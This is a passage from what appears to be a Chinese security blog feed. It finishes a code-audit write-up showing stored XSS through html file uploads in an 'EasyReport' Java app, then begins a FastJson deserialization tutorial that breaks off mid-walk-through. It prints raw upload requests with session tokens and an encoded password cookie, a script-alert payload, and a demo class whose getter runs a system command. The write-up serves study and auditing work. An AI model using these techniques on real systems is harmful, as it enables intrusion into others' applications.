class="line">&#125;</span><br></pre></td></tr></table></figure><p>​跟踪upload方法，我们来到文件上传的校验环节。在src&#x2F;main&#x2F;java&#x2F;com&#x2F;sdyx&#x2F;common&#x2F;utils&#x2F;file&#x2F;MimeTypeUtils.java中找到了允许的后缀。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String[] DEFAULT_ALLOWED_EXTENSION = &#123;</span><br><span class="line">        <span class="comment">// 图片</span></span><br><span class="line">        <span class="string">&quot;bmp&quot;</span>, <span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;png&quot;</span>,</span><br><span class="line">        <span class="comment">// word excel powerpoint</span></span><br><span class="line">        <span class="string">&quot;doc&quot;</span>, <span class="string">&quot;docx&quot;</span>, <span class="string">&quot;xls&quot;</span>, <span class="string">&quot;xlsx&quot;</span>, <span class="string">&quot;ppt&quot;</span>, <span class="string">&quot;pptx&quot;</span>, <span class="string">&quot;html&quot;</span>, <span class="string">&quot;htm&quot;</span>, <span class="string">&quot;txt&quot;</span>,</span><br><span class="line">        <span class="comment">// 压缩文件</span></span><br><span class="line">        <span class="string">&quot;rar&quot;</span>, <span class="string">&quot;zip&quot;</span>, <span class="string">&quot;gz&quot;</span>, <span class="string">&quot;bz2&quot;</span>,</span><br><span class="line">        <span class="comment">// 视频格式</span></span><br><span class="line">        <span class="string">&quot;mp4&quot;</span>, <span class="string">&quot;avi&quot;</span>, <span class="string">&quot;rmvb&quot;</span>,</span><br><span class="line">        <span class="comment">// pdf</span></span><br><span class="line">        <span class="string">&quot;pdf&quot;</span>&#125;;</span><br></pre></td></tr></table></figure><p>​这个字符串数组定义的是可上传的后缀，同时在原文件中还限制了文件名的长度不能大于100。可见这里允许了html文件，所以这里理论上是存在一个存储型XSS的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String <span class="title function_">extractFilename</span><span class="params">(MultipartFile file)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> file.getOriginalFilename();</span><br><span class="line">    <span class="type">String</span> <span class="variable">extension</span> <span class="operator">=</span> getExtension(file);</span><br><span class="line">    fileName = DateUtils.datePath() + <span class="string">&quot;/&quot;</span> + IdUtils.fastUUID() + <span class="string">&quot;.&quot;</span> + extension;</span><br><span class="line">    <span class="keyword">return</span> fileName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这里对文件名进行修改，所以这里是不存在目录穿透的。最后经过审计我们可知，该文件上传功能点存在一个存储型XSS。我们回到前端进行测试。</p><p>​随便上传一个图片后抓包，抓得如下数据包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dev-api/system/user/profile/avatar</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.24.90.8:8000</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjZkNDhiMmMzLThlMDgtNDAzZi1iNzk0LWQxYWViMDQwZGZlMSJ9.t_SOgu7h_e2mjaTUA-OLw8neXClK1TjAwsg15ZBHB1St5oE2gbKgkyxcBxzqiOlkKg44-rw-ERn_iKOvdLTPYA</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.24.90.8:8000</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.24.90.8:8000/user/profile</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>username=admin; password=da+wRqhdcPVb8lT9ZGqw8QLuMvePnL/qj/rU31B9A381haug92QdObElWCPobmyoDiET/jj9mCCGTGSSL+jeZQ==; rememberMe=true; Admin-Token=eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjZkNDhiMmMzLThlMDgtNDAzZi1iNzk0LWQxYWViMDQwZGZlMSJ9.t_SOgu7h_e2mjaTUA-OLw8neXClK1TjAwsg15ZBHB1St5oE2gbKgkyxcBxzqiOlkKg44-rw-ERn_iKOvdLTPYA</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarykFiiAB8b31Yj58Jb</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>146895</span><br><span class="line"></span><br><span class="line"><span class="language-nix">------WebKitFormBoundarykFiiAB8b31Yj58Jb</span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Disposition:</span> form-data; <span class="attr">name</span><span class="operator">=</span><span class="string">&quot;avatarfile&quot;</span>; <span class="attr">filename</span><span class="operator">=</span><span class="string">&quot;blob&quot;</span></span></span><br><span class="line"><span class="language-nix"><span class="params">Content-Type:</span> image<span class="symbol">/jpeg</span></span></span><br><span class="line"><span class="language-nix"></span></span><br><span class="line"><span class="language-nix">&#123;&#123;unquote(<span class="string">&quot;...原文件内容省略...&quot;</span>)&#125;&#125;</span></span><br><span class="line"><span class="language-nix"><span class="operator">-</span>-----WebKitFormBoundarykFiiAB8b31Yj58Jb--</span></span><br><span class="line"><span class="language-nix"></span></span><br></pre></td></tr></table></figure><p>​我们在文件内容中插入XSSpayload:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​在修改后缀为html。</p><p>​<img src="/img/EasyReport/image-20250104123626239.png" alt="image-20250104123626239"></p><p>​发送后访问返回包中的url即可触发XSS攻击。</p><p><img src="/img/EasyReport/image-20250104123712557.png" alt="image-20250104123712557"></p><h4 id="src-main-java-com-sdyx-web-controller-common-CommonController-java（成功）"><a href="#src-main-java-com-sdyx-web-controller-common-CommonController-java（成功）" class="headerlink" title="src&#x2F;main&#x2F;java&#x2F;com&#x2F;sdyx&#x2F;web&#x2F;controller&#x2F;common&#x2F;CommonController.java（成功）"></a>src&#x2F;main&#x2F;java&#x2F;com&#x2F;sdyx&#x2F;web&#x2F;controller&#x2F;common&#x2F;CommonController.java（成功）</h4><p>​在审计头像上传过程中我们发现还有一处控制器调用了文件上传的实现代码，所以我们来到这个通用上传控制器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping(&quot;/common/upload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> AjaxResult <span class="title function_">uploadFile</span><span class="params">(MultipartFile file)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 上传文件路径</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> EasyReportConfig.getUploadPath();</span><br><span class="line">        <span class="comment">// 上传并返回新文件名称</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> FileUploadUtils.upload(filePath, file);</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> serverConfig.getUrl() + fileName;</span><br><span class="line">        <span class="type">AjaxResult</span> <span class="variable">ajax</span> <span class="operator">=</span> AjaxResult.success();</span><br><span class="line">        ajax.put(<span class="string">&quot;fileName&quot;</span>, fileName);</span><br><span class="line">        ajax.put(<span class="string">&quot;url&quot;</span>, url);</span><br><span class="line">        <span class="keyword">return</span> ajax;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">return</span> AjaxResult.error(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​我们构造如下数据包，即可调用upload方法。</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/dev-api/common/upload</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.24.90.8:8000</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/plain, */*</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Bearer eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjZkNDhiMmMzLThlMDgtNDAzZi1iNzk0LWQxYWViMDQwZGZlMSJ9.t_SOgu7h_e2mjaTUA-OLw8neXClK1TjAwsg15ZBHB1St5oE2gbKgkyxcBxzqiOlkKg44-rw-ERn_iKOvdLTPYA</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://172.24.90.8:8000</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://172.24.90.8:8000/user/profile</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>username=admin; password=da+wRqhdcPVb8lT9ZGqw8QLuMvePnL/qj/rU31B9A381haug92QdObElWCPobmyoDiET/jj9mCCGTGSSL+jeZQ==; rememberMe=true; Admin-Token=eyJhbGciOiJIUzUxMiJ9.eyJsb2dpbl91c2VyX2tleSI6IjZkNDhiMmMzLThlMDgtNDAzZi1iNzk0LWQxYWViMDQwZGZlMSJ9.t_SOgu7h_e2mjaTUA-OLw8neXClK1TjAwsg15ZBHB1St5oE2gbKgkyxcBxzqiOlkKg44-rw-ERn_iKOvdLTPYA</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundarykFiiAB8b31Yj58Jb</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>146895</span><br><span class="line"></span><br><span class="line"><span class="language-jboss-cli"><span class="params">------WebKitFormBoundarykFiiAB8b31Yj58Jb</span></span></span><br><span class="line"><span class="language-jboss-cli">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;blob&quot;</span></span></span><br><span class="line"><span class="language-jboss-cli">Content-Type: image/jpeg</span></span><br><span class="line"><span class="language-jboss-cli"></span></span><br><span class="line"><span class="language-jboss-cli"><span class="string">...</span>此处插入文件内容<span class="string">...</span></span></span><br><span class="line"><span class="language-jboss-cli"><span class="params">------WebKitFormBoundarykFiiAB8b31Yj58Jb--</span></span></span><br><span class="line"><span class="language-jboss-cli"></span></span><br></pre></td></tr></table></figure><p>​这里没什么好说的，和上一个同样的漏洞， 在文件内容处插入XSSpayload并修改文件后缀为html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;xss&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​<img src="/img/EasyReport/image-20250104125405239.png" alt="image-20250104125405239"></p><p>​访问返回的URL即可。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Code Audit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化-FastJson</title>
      <link href="/2025/01/04/JavaFastJson/"/>
      <url>/2025/01/04/JavaFastJson/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>​虽然审了不少的Javaweb项目，但是我还是是认为自己的Java反序列化的知识点不够深刻，所以还是决定深度学习一下反序列化的知识点，而FastJson又是比较常见的Java反序列化依赖，所以决定从FastJson着手来学习Java反序列化。</p><h2 id="FastJson简介"><a href="#FastJson简介" class="headerlink" title="FastJson简介"></a>FastJson简介</h2><p>​Fastjson 是 Alibaba 开发的 Java 语言编写的高性能 JSON 库，用于将数据在 JSON 和 Java Object 之间互相转换。</p><p>​提供两个主要接口来分别实现序列化和反序列化操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">JSON.toJSONString <span class="comment">//将 Java 对象转换为 json 对象，序列化的过程。</span></span><br><span class="line">JSON.parseObject/JSON.parse <span class="comment">//将 json 对象重新变回 Java 对象；反序列化的过程</span></span><br></pre></td></tr></table></figure><p>​所以可以简单的把 json 理解成是一个字符串。</p><p>​这里的知识点和PHP的反序列化实际是相同的，不同的只是反序列化的过程中所调用的方法不同，所以可以互相类比，这里贴出我之前所写的PHP反序列化的文章链接，有兴趣的师傅可以去看一下。</p><p><a href="https://blog.csdn.net/2301_79629995/article/details/142713714?spm=1001.2014.3001.5501">序列化与反序列化基础及反序列化漏洞(附案例)_反序列化漏洞代码-CSDN博客</a></p><h2 id="简单的序列化demo"><a href="#简单的序列化demo" class="headerlink" title="简单的序列化demo"></a>简单的序列化demo</h2><h3 id="依赖引入"><a href="#依赖引入" class="headerlink" title="依赖引入"></a>依赖引入</h3><p>​为了深刻的理解FastJson的漏洞，这里提供一个简单的代码demo。先创建一个springboot项目，然后再pom文件中引入依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>​版本其实无所谓，这只是一个简单演示，只是为了方便理解FastJson的工作原理。</p><h3 id="类定义"><a href="#类定义" class="headerlink" title="类定义"></a>类定义</h3><p>​简单定义一个类，注意：<strong>其中无参构造方法不可省略，否则反序列化过程中将无法正确加载类。</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, <span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;unser!!!&quot;</span>);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="控制器代码"><a href="#控制器代码" class="headerlink" title="控制器代码"></a>控制器代码</h3><p>​然后再写一个控制器，调用JSON.toJSONString去序列化对象，并添加选项SerializerFeature.WriteClassName，让他写出类名。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FastJsontest</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping(&quot;/&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">index</span><span class="params">(String name,<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">thisuser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(name,age);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(thisuser, SerializerFeature.WriteClassName);</span><br><span class="line">        <span class="keyword">return</span> json;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​启动项目后来到前端，访问如下URL：<a href="http://127.0.0.1:8080/?name=123&age=12">127.0.0.1:8080&#x2F;?name&#x3D;123&amp;age&#x3D;12</a>，他会返回如下的JSON字符串</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.example.demo.User&quot;</span><span class="punctuation">,</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">12</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​这样一个简单demo就搭建好了。</p><h2 id="序列化过程"><a href="#序列化过程" class="headerlink" title="序列化过程"></a>序列化过程</h2><p>​我们设置断点后运行一下。跟踪后来到了这个方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toJSONString</span><span class="params">(Object object, <span class="type">int</span> defaultFeatures, SerializerFeature... features)</span> &#123;</span><br><span class="line">    <span class="type">SerializeWriter</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializeWriter</span>((Writer)<span class="literal">null</span>, defaultFeatures, features);</span><br><span class="line"></span><br><span class="line">    String var5;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">JSONSerializer</span> <span class="variable">serializer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONSerializer</span>(out);</span><br><span class="line">        serializer.write(object);</span><br><span class="line">        var5 = out.toString();</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> var5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​序列化是在serializer.write(object);这一步完成的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (object == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.out.writeNull();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = object.getClass();</span><br><span class="line">        <span class="type">ObjectSerializer</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="built_in">this</span>.getObjectWriter(clazz);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            writer.write(<span class="built_in">this</span>, object, (Object)<span class="literal">null</span>, (Type)<span class="literal">null</span>, <span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(e.getMessage(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​这一步是在获取类。**writer.write(this, object, (Object)null, (Type)null, 0);**中比较关键的参数有两个。一个是this中的typekey，这个是序列化完成后JSON字符串中类的键。一个就是object，这个是类名。之后就是将类中的参数也并入字符串中。</p><h2 id="反序列化demo"><a href="#反序列化demo" class="headerlink" title="反序列化demo"></a>反序列化demo</h2><h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/unser&quot;)</span>    </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">unser</span><span class="params">(String text)</span> &#123;</span><br><span class="line">       JSONObject user=JSON.parseObject(text);</span><br><span class="line">       System.out.println(user);</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>​访问：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;123&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;age&quot;</span><span class="punctuation">:</span> <span class="number">123</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="反序列化过程"><a href="#反序列化过程" class="headerlink" title="反序列化过程"></a>反序列化过程</h2><p>​打上断点后运行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">parse</span><span class="params">(String text, <span class="type">int</span> features)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (text == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">DefaultJSONParser</span> <span class="variable">parser</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultJSONParser</span>(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> parser.parse();</span><br><span class="line">        parser.handleResovleTask(value);</span><br><span class="line">        parser.close();</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​**Object value &#x3D; parser.parse();**反序列化是在这一步完成的。</p><p><img src="/img/JavaFastJson/image-20250104175346873.png" alt="image-20250104175346873"></p><p>​这个方法代码较长，所以这里就只截图了，该方法首先判断lexer.token()返回的值，返回值为12，对应</p><p><img src="/img/JavaFastJson/image-20250104175637464.png" alt="image-20250104175637464"></p><p>​我们传入的字符串也确实’{‘开头，然后12的情况会交给这个方法来处理。</p><p><img src="/img/JavaFastJson/image-20250104175805801.png" alt="image-20250104175805801"></p><p>​继续跟进，<strong>JSONObject object &#x3D; new JSONObject(lexer.isEnabled(Feature.OrderedField));<strong>这一步返回了一个空的object。继续跟进</strong>this.parseObject((Map)object, fieldName);</strong></p><p><img src="/img/JavaFastJson/image-20250104180537401.png" alt="image-20250104180537401"></p><p>​这一步又对token进行了几次判断。</p><p><img src="/img/JavaFastJson/image-20250104181156564.png" alt="image-20250104181156564"></p><p>​这是一个死循环，从上往下的逻辑为，跳过空格，获取当前字符，AllowArbitraryCommas这里是遇到多个逗号会跳过。</p><p><img 